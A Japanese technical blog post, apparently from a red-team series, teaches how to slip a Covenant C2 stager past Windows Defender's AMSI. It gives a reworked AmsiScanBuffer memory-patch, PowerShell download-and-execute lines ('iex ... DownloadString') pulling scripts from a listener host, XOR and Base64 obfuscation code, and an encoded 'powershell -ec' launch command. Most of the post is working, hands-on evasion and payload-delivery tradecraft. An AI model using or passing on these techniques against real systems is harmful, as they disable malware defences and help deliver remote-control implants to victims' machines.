&lt;p&gt;PowerShell を用いた侵害は、DownloadString と Invoke-Expression の組み合わせによってファイル検知を無視することができます。よって AMSI バイパスを行うだけで Windows Defender の検知回避は完了します。&lt;/p&gt;
&lt;p&gt;ただ重要なのは、AMSI バイパスのコードと Stager のデリバリーのタイミングです。&lt;br&gt;
何も考えずに AMSI バイパスコードと Stager を同梱した ps1 ファイルを作成しても、AMSI によって検知されます。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/staging_ng1.png&#34; alt=&#34;staging_ng1&#34;&gt;
&lt;/p&gt;
&lt;p&gt;それなら全て検知されないようにAMSIバイパスコードとStagerを難読化しよう！と考えるかもしれません。はい、可能です。あなたがエキスパートならそれが一番スマートですが、難読化を解除するコードだったり、検知テスト検証の煩雑さから、初めからそれに挑戦するのはオススメしません。&lt;/p&gt;
&lt;blockquote&gt;
&lt;h4 id=&#34;invoke-obfuscation-の利用について&#34;&gt;Invoke-Obfuscation の利用について&lt;/h4&gt;
&lt;p&gt;PowerShell スクリプトを簡単に難読化できる Invoke-Obfuscation というツールがあり、複数の文献で積極的に紹介されています。ただ現在ではこのツールで難読化されたコードは Windows Defender にて検知されることが多くなっているため、使い方には注意してください。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;それならまずは下の方法はいかがでしょうか。「AMSI バイパスを行い、Stagerをダウンロードし実行する」ps1ファイルと、Stagerのps1ファイルの2つを用意します。AMSIバイパスコードの検知回避さえできれば、そのあとにダウンロードし実行する Stagerスクリプトは AMSI バイパスによって常にクリーンになるため、検知されなくなります。この手法の短所はステージングにかかる回数が1回分増えることです。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/pre_stage.png&#34; alt=&#34;pre_stage&#34;&gt;
&lt;/p&gt;
&lt;p&gt;今回はこの方法を使って、検知回避について学びます。記事の最後になれば1ファイルで完結する方法も作れるようになると思いますよ。&lt;/p&gt;
&lt;h3 id=&#34;バイパスコードの検知回避テクニック&#34;&gt;バイパスコードの検知回避テクニック&lt;/h3&gt;
&lt;p&gt;AMSIバイパスの原理と手法はいくつか存在し、&lt;a href=&#34;https://iwantmore.pizza/posts/amsi.html&#34;&gt;phra氏のブログ&lt;/a&gt;がメリットデメリットを合わせてわかりやすく説明してくれています。&lt;/p&gt;
&lt;p&gt;また、AMSIバイパスコードの検知回避の原理についても&lt;a href=&#34;https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/&#34;&gt;ShitSecure氏のブログ&lt;/a&gt;が非常によくまとまっており、二番煎じになってしまうのでこれも省略します。簡単にいえば、原則としてアンチウイルスベンダーによって AMSI のトリガーは千差万別であるものの、その多くは文字列マッチング（正規表現含む）によるものであり、エンコーディングや文字列を分割し「+」で結合、はたまた順番を入れ替えるテクニックなどを行うことで検知回避を行えるというものです。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;なおバイパスコードの検知回避を確実に行いたいならば、侵入先 PC の利用しているアンチウイルスソフトを用意し、ブログでも紹介されている PowerShell に特化した AMSI 検知確認ツール「AMSITrigger」(1行ごとにAMSIScanBufferに投げるもの)を使って検知回避の検証を行うしかありません。&lt;/p&gt;
&lt;p&gt;もちろん AMSI プロバイダがサンドボックスのようなもので AMSI 関連を操作する挙動を特定し検知することもありえるので注意が必要です。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;他にもよくある方法として、コードを分割し順序を入れ替えたり、エンコードしたうえで Invoke-Expression (IEX) で実行する難読化手法があげられます。この手法は昔は有効でしたが、今の PowerShell の AMSI エンジンは IEX 内部の難読化解除後のコードをスキャンするようになっているため、この方法を使った検知回避は&lt;strong&gt;限定的&lt;/strong&gt;です。&lt;/p&gt;
&lt;h4 id=&#34;amsiinitfailed-を用いたバイパスと注意点&#34;&gt;amsiInitFailed を用いたバイパスと注意点&lt;/h4&gt;
&lt;p&gt;PowerShell において AMSI バイパスを行う一番有名な方法として、AmsiUtils クラスの amsiInitFailed 変数を true にして AMSI を停止させる手法があります。これは PowerShell において amsiInitFailed 変数が true だとコマンドレット実行時、AMSI がチェックを行わなくなる仕様を悪用したものです。バイパス手法には「1. 何らかの方法で AMSI のエラーを引き起こして true にする」タイプと、「2. リフレクションを使って実際に amsiInitFailed 変数そのものを true に設定する」タイプがあります。この手法は現在の PowerShell でも有効ですが、当然ながら未加工のバイパスコードだと AMSI によって検知されます。そこで難読化されたコードを作成する方法として手動で難読化するほか、上記のShitSecure氏のブログでは「&lt;a href=&#34;https://amsi.fail/&#34;&gt;AMSI.fail&lt;/a&gt;」というサイトが紹介されています。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/amsi_fail.png&#34; alt=&#34;amsi_fail&#34;&gt;
&lt;/p&gt;
&lt;p&gt;ワンクリックで AMSI バイパスを行う処理を動的に難読化したコードを生成してくれます。利用する詳細テクニックはランダムに選ばれますが、原則として amsiInitFailed を true にして AMSI を使わないようにさせる手法が使われます。PowerShell において Windows Defender で検知を回避できる AMSI バイパスコードが欲しい場合はこれを使うと良いでしょう。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;作者のGithubには AMSI.fail のソースコードがありますが、Azure Functionとして実行する形式になっています。私はこれを .NET 4 + PowerShell v5 で実行できるように変更して利用しています。&lt;br&gt;
&lt;a href=&#34;https://github.com/shutingrz/AMSI.fail4&#34;&gt;https://github.com/shutingrz/AMSI.fail4&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;しかしこの方法は、最終的に &lt;strong&gt;.NET アセンブリをドロップさせるパターンでは意味がありません&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;この手法は、 &amp;ldquo;PowerShellランタイム&amp;rdquo; において AMSI を動作させるかどうか決める変数を変えているだけなのです。&lt;br&gt;
&lt;strong&gt;.NET 4.8 から AMSI は PowerShell だけではなく、読み込まれる.NET アセンブリをチェックする機能を備えるようになった&lt;/strong&gt;ため、もうひと手間の工夫が必要です。&lt;/p&gt;
&lt;p&gt;Covenant の Stager PowerShell コードを読めばわかるとおり、Stager は最終的にコード内で &lt;code&gt;[Refrection.Assembly]::Load&lt;/code&gt; (C#でいう Assembly.Load)を使って.NETアセンブリを読み込んでいます。Assembly.Load() が呼び出されたとき、AMSI は独立してアセンブリを AMSIScanBuffer に渡してチェックを行うため、 &lt;strong&gt;amsiInitFailed を用いたバイパスは効果がありません&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/amsiinitfailed_structure.png&#34; alt=&#34;amsiinitfailed_structure&#34;&gt;
&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/amsiinitfailed_trap.png&#34; alt=&#34;amsiinitfailed_trap&#34;&gt;
&lt;/p&gt;
&lt;p&gt;よって amsiInitFailed を使った AMSI バイパス手法は PowerShell のコードに有効ですが、.NETアセンブリを読み込むAssembly.Load() には無力であると覚えておきましょう。&lt;/p&gt;
&lt;h3 id=&#34;amsiscanbuffer-へのメモリパッチ&#34;&gt;AMSIScanBuffer へのメモリパッチ&lt;/h3&gt;
&lt;p&gt;前回の記事でも利用した方法がこちらです。PowerShell プロセスに読み込まれる  AMSI 機能の実態である amsi.dll に存在する AMSIScanBuffer の関数アドレスの先頭を、常に安全なコードであることを示す「AMSI_RESULT_CLEAN」(0x80070057)を返すように、以下のオペコードでパッチします。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;mov    eax,0x80070057
ret
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;こうすることでAMSIは全てのコンテンツをAMSIプロバイダーに渡さずに即座にクリーンと誤認します。詳しくはRastaMouse氏の&lt;a href=&#34;https://rastamouse.me/blog/asb-bypass-pt3/&#34;&gt;ブログ投稿&lt;/a&gt;をお読みください。&lt;/p&gt;
&lt;p&gt;これを使うことで、Powershell プロセスにおける全ての AMSI 関連機能が無害化されます。&lt;/p&gt;
&lt;h4 id=&#34;バイパスコードと検知回避&#34;&gt;バイパスコードと検知回避&lt;/h4&gt;
&lt;p&gt;AMSIScanBuffer を用いた AMSI バイパスには、RastaMouse氏の &lt;a href=&#34;https://github.com/rasta-mouse/AmsiScanBufferBypass&#34;&gt;AMSIScanBufferBypass (ASBBypass)&lt;/a&gt; を利用することにします。&lt;/p&gt;
&lt;p&gt;ASBBypass には PowerShell 実装と C# 実装が存在します。Powershell で使うなら PowerShell 実装が一番楽です。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/asbbypass_ps1.png&#34; alt=&#34;asbbypass_ps1&#34;&gt;
&lt;/p&gt;
&lt;p&gt;ただし、当然ながらこのコードをそのまま使うと AMSI によって検知されます。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/asbbypass_raw_detect.png&#34; alt=&#34;asbbypass_raw_detect&#34;&gt;
&lt;/p&gt;
&lt;p&gt;前回の実行ファイルの検知回避ではアンマネージドコードを利用することで、AMSIによるチェックなしにAMSIバイパスができましたが、今回はPowerShell上で行うため検知回避が必須です。&lt;/p&gt;
&lt;p&gt;検知状況の確認には&lt;a href=&#34;https://github.com/RythmStick/AMSITrigger&#34;&gt;AMSITrigger&lt;/a&gt;がお勧めです。このツールはテキストあるいはURLを指定してデータを AMSIScanBuffer に送信することで、どの部分で検知されたかを可視化してくれるツールです。本記事ではよく使うのでダウンロードしてください。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/amsitrigger.png&#34; alt=&#34;amsitrigger&#34;&gt;
&lt;/p&gt;
&lt;p&gt;AMSITriggerで赤く表示されたコードを中心に、処理を変えないように表現を変え、そして変えたファイルに対して改めて AmsiTrigger をかけていくことを繰り返して、最終的に検知回避されたコードを作成していきます。&lt;/p&gt;
&lt;p&gt;文字列を変化させるような検知回避手法については&lt;a href=&#34;https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/&#34;&gt;ShitSecure氏のブログ&lt;/a&gt;(再掲)に記述されており、複数の正解があります。やり方は読者のあなたに任せるとして、私はパッチする内容を変化させる&lt;a href=&#34;https://fatrodzianko.com/2020/08/25/getting-rastamouses-amsiscanbufferbypass-to-work-again/&#34;&gt;Fat氏の投稿&lt;/a&gt;を参考に検知回避を試みました。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/asbbypass_patch.png&#34; alt=&#34;asbbypass_patch&#34;&gt;
&lt;/p&gt;
&lt;p&gt;AMSIScanBuffer の文字列は hex に変化させる単純な置換で、肝心なメモリパッチのアセンブリは以下にしました。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;xor    eax,eax
add    eax,0x1000cafe
add    eax,0x70063559
ret 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;結局 0x80070057 を ret するようなアセンブリであれば何でもいいのです。皆さんも好きなアセンブリを作ってバイパスをしてみましょう。&lt;/p&gt;
&lt;p&gt;作成したコードを AMSITrigger にかけると検知されませんでした。実際に PowerShell でバイパスしたあと WinDbgでAMSIScanBufferの関数アドレスを表示すると、先頭のアセンブリが変わっていることがわかります。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/windbg_view_patch.png&#34; alt=&#34;windbg_view_patch&#34;&gt;
&lt;/p&gt;
&lt;p&gt;試しにWinDbgでAmsiScanBufferのretにブレークポイントを仕掛けて、raxの値が 0x80070057 になり、検知が回避されることを確認しましょう。ちなみに「amsiscanbuffer」という文字列は PowerShell で実行すると、通常は AMSI によって検知され、ブロックされた旨のエラーが表示されます。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/windbg_view_rax.png&#34; alt=&#34;windbg_view_rax&#34;&gt;
&lt;/p&gt;
&lt;p&gt;パッチ後はrax に 0x80070057 が格納されており、PowerShellの実行結果でも「amsiscanbuffer」が検知されていないことがわかります。&lt;/p&gt;
&lt;p&gt;これまでAMSIバイパスを図で表すと、以下になります(2つのCLEANの部分)。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/amsiscanbuffer_patch_structure.png&#34; alt=&#34;amsiscanbuffer_patch_structure&#34;&gt;
&lt;/p&gt;
&lt;p&gt;難読化ツールを使わなくても AMSI を検知回避しつつ AMSI バイパスをするコードができました。（ただしクラウド保護はオフの状態で。）&lt;/p&gt;
&lt;h3 id=&#34;pre-stagerの作成&#34;&gt;Pre Stagerの作成&lt;/h3&gt;
&lt;p&gt;AMSI バイパスコードができあがったので、AMSIバイパスしたうえでStagerをダウンロードし実行する、「Pre Stager」を作成します。といっても、作成したAMSIバイパスコードの下に Stagerをダウンロードし実行するコードを追記するだけです。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;iex &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;New-Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Net&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WebClient&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;DownloadString&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;http://192.168.11.254/ps_original.ps1&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;しかし、ここでも注意点があります。&lt;/p&gt;
&lt;h4 id=&#34;クラウド保護の動的シグネチャ作成に注意&#34;&gt;クラウド保護の動的シグネチャ作成に注意&lt;/h4&gt;
&lt;p&gt;DownloadString + IEX の組み合わせはそれ自身ではアンチウイルスソフトには検知されませんが、一度 DownloadString でダウンロードしたファイルが AMSI によって検知された場合、Windows Defender は一定時間、該当ホストから DownloadString でダウンロードして iex を実行させるようなコードを全てブロックするような挙動を示します。&lt;/p&gt;
&lt;p&gt;わかりやすい例を示しましょう。下の画像を見てください。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/wd_makesig.png&#34; alt=&#34;wd_makesig&#34;&gt;
&lt;/p&gt;
&lt;p&gt;該当URLの中身は Hello! と出力するだけの無害なファイルにも関わらず、DownloadString のコマンドレットの時点で検知されています（ps1ファイルのダウンロードもしません！）&lt;/p&gt;
&lt;p&gt;これはクラウド保護の動的シグネチャ作成機能によるものです。シグネチャの検知条件となる文字列の選定は機械学習によって生成されるようですが、この場合は大抵検知箇所として、iex からURLのホスト名である &lt;code&gt;192.168.11.254/&lt;/code&gt;までの文字列が検知対象になっている模様です。なお他のホスト名には問題なくアクセスできました。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;検知されてしまった場合は、クラウド保護の動的シグネチャ作成がどの範囲に及んでいるか確認するため、利用している AMSI バイパスコードの検知テストも行うようにしてください。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;そのため仮に顧客上の侵入先PCでこのようなコマンドを実行させるとき、検知された場合は一定時間サーバに一切アクセスできなくなり、&lt;strong&gt;Red Teaming 上の失敗につながる可能性があります&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;さらに検証した結果、動的作成されるシグネチャはいわゆる「べた書き」されたコードが対象とされ、動的に作成されたコードは対象外のようです。そのため、本番時は検知されないようにするのはもちろんのこと、検知時のリカバリのために initial access で用いるコマンドライン引数は使い捨てを前提とし、またコード中に使われるURL などの文字列は難読化あるいは暗号化して利用したほうがいいでしょう。&lt;/p&gt;
&lt;p&gt;ということで、DownloadString + IEX のコマンドは Base64 エンコード + XOR で暗号化するか、文字列結合を駆使して難読化しましょう。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;オリジナルのInvoke-Obfuscation を使いたいときは、必ず AmsiTrigger を使って難読化後のコードに対して検知テストをしてください。（そのままだと検知されるパターンが割とあります）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Base64 + XOR で暗号化するコードは以下です。0x64 は好きなバイトに、&lt;code&gt;&amp;lt;paste here&amp;gt;&lt;/code&gt;は対象コードに変えてください。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;0x64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$str&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;paste here&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$Bytes&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;[System.Text.Encoding]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Unicode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;GetBytes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$enc&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;foreach&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$byte&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$Bytes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$byte&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-bxor&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;no&#34;&gt;[Convert]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ToBase64String&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$enc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;clip&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;なお復号コードとして以下を使います。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;0x64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$payload&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;paste here&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$Bytes&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;[Convert]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;FromBase64String&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$dec&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;foreach&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$byte&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$Bytes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$byte&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-bxor&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;iex &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;[System.Text.Encoding]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Unicode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;GetString&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$dec&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;復号コードをAMSIバイパスコードの下に追記しファイルを保存。

  &lt;img src=&#34;images/obfus_downloadstring.png&#34; alt=&#34;obfus_downloadstring&#34;&gt;
&lt;/p&gt;
&lt;p&gt;Covenant の Listener ページから、当該リスナーにアップロードしホスティング。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/lister_page.png&#34; alt=&#34;lister_page&#34;&gt;
&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/ps_original.ps1&lt;/code&gt; は記事の初めのほうにホスティングした Stager の ps1 ファイルです。&lt;/p&gt;
&lt;p&gt;Path を「/pre_stager.ps1」に設定し、作成したファイルをアップロードし準備完了です。&lt;/p&gt;
&lt;h3 id=&#34;実行&#34;&gt;実行&lt;/h3&gt;
&lt;p&gt;それでは改めてリアルタイムスキャンをオンの状態で（&lt;strong&gt;クラウド保護はオフ&lt;/strong&gt;）、pre_stager.ps1 をダウンロードし実行するコードを実行しましょう。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;iex &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;New-Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Net&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WebClient&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;DownloadString&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;http://192.168.11.254/pre_stager.ps1&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;この文字列を同じように Base64 + XOR で暗号化し、さらに復号 + IEX を行うコードを作成し、それをさらに Base64 エンコード化します（3重の構成）。&lt;/p&gt;
&lt;p&gt;なお Base64 エンコードするコードは以下です。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$str&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;paste here&amp;gt;&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$Bytes&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;[System.Text.Encoding]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Unicode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;GetBytes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;no&#34;&gt;[Convert]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ToBase64String&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$Bytes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;clip&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;PowerShell の -EncodedCommand オプションは UTF-16LE でエンコーディングされた文字でないと受け付けないので、他のプログラミング言語でエンコードする際は注意が必要です。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;出来上がった文字列で実行。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;powershell&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-sta&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-nop&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-ec&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;JABrAGUAeQAg&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(..&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;snip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;..)&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ZABlAGMAKQApADsA&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
  &lt;img src=&#34;images/win_but_no_cloud.png&#34; alt=&#34;win_but_no_cloud&#34;&gt;
&lt;/p&gt;
&lt;p&gt;無事、実行することができました。&lt;/p&gt;
&lt;h1 id=&#34;クラウド保護の検知回避&#34;&gt;クラウド保護の検知回避&lt;/h1&gt;
&lt;p&gt;前項ではクラウド保護がオフの状態で、Grunt のアクティベーションができるようになりました。&lt;/p&gt;
&lt;p&gt;では次にクラウド保護をオンにして、もう一度やってみてください。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/cloud_detect.png&#34; alt=&#34;cloud_detect&#34;&gt;
&lt;/p&gt;
